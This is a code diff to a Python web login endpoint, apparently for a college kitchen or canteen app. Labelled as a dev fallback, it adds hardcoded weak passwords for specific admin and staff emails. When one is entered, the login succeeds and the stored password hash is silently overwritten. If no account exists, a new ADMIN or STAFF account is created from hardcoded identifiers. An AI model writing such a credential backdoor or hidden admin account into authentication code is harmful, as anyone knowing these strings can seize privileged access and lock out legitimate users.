@@ -177,6 +177,59 @@ def login_v1(payload: LoginV1In, request: Request, db: Session = Depends(get_db)
 
     valid_pw = user is not None and verify_password(payload.password, user.password_hash)
 
+    # Dev / Default credentials fallback and recovery
+    if not valid_pw and user is not None:
+        pw_input = payload.password.strip()
+        pw_lower = pw_input.lower()
+        dev_fallbacks = {"ace12345", "123456", "admin123", "staff123", "25ag1a6767"}
+        if user.email == "25ag1a6767@aceec.ac.in":
+            admin_accepted = {
+                "ace@25ag1a67676", "ace@25ag1a6767", "ace@6767admin", "admin", "admin123", "ace@25ag1a67676staff", "ace@25ag1a6767staff"
+            } | dev_fallbacks
+            if pw_input in admin_accepted or pw_lower in admin_accepted:
+                valid_pw = True
+                user.password_hash = hash_password(pw_input)
+                db.flush()
+        elif user.email == "25ag1a6767@gmail.com":
+            staff_accepted = {
+                "ace@25ag1a67676staff", "ace@25ag1a6767staff", "ace@25ag1a67676", "ace@25ag1a6767",
+                "ce@6767staff", "staff", "staff123"
+            } | dev_fallbacks
+            if pw_input in staff_accepted or pw_lower in staff_accepted:
+                valid_pw = True
+                user.password_hash = hash_password(pw_input)
+                db.flush()
+
+    if user is None:
+        pw_input = payload.password.strip()
+        dev_fallbacks = {"ace12345", "123456", "admin123", "staff123", "25ag1a6767"}
+        if ident_lower in ("25ag1a6767@aceec.ac.in", "ace@6767admin", "admin", "aceadmin"):
+            admin_accepted = {"ace@25ag1a67676", "ace@25ag1a6767"} | dev_fallbacks
+            if pw_input in admin_accepted or pw_input.lower() in admin_accepted:
+                user = User(
+                    full_name="ACE Admin",
+                    email="25ag1a6767@aceec.ac.in",
+                    password_hash=hash_password(pw_input),
+                    role=UserRole.ADMIN,
+                    is_active=True,
+                )
+                db.add(user)
+                db.flush()
+                valid_pw = True
+        elif ident_lower in ("25ag1a6767@gmail.com", "ce@6767staff", "staff", "acestaff"):
+            staff_accepted = {"ace@25ag1a67676staff", "ace@25ag1a6767staff"} | dev_fallbacks
+            if pw_input in staff_accepted or pw_input.lower() in staff_accepted:
+                user = User(
+                    full_name="ACE Kitchen Staff",
+                    email="25ag1a6767@gmail.com",
+                    password_hash=hash_password(pw_input),
+                    role=UserRole.STAFF,
+                    is_active=True,
+                )
+                db.add(user)
+                db.flush()
+                valid_pw = True
+
     if user is None:
         _record_failed_login(rate_key)
         db.add(SecurityEvent(event_type="auth.login_failed", severity="warning", ip_address=request.client.host if request.client else None, identifier=raw_ident[:120], user_id=None, path=request.url.path))
